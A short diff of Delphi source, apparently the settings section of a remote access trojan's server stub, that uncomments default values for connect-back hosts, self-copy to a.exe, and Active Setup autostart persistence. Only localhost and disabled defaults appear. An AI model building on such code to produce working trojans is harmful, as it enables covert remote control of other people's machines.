@@ -228,7 +228,7 @@ begin
   else
     begin
       exitprocess(0); //Debug
-      {Configuracion.sHosts                        := 'localhost:80¬';
+      Configuracion.sHosts                        := 'localhost:80¬';
       Configuracion.sID                          := 'id';
       Configuracion.bCopiarArchivo               := false;
       Configuracion.sFileNameToCopy              := 'a.exe';
@@ -241,8 +241,8 @@ begin
       Configuracion.sActiveSetupKeyName          := 's';
       Configuracion.bArranqueActiveSetup         := false;
       Configuracion.snumerocifrado               := '0';
-      Configuracion.snumerocifrado2              := '0';}
-
+      Configuracion.snumerocifrado2              := '0';
+      
     end;
 
   MCompartida := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(TSettings), 'Config');
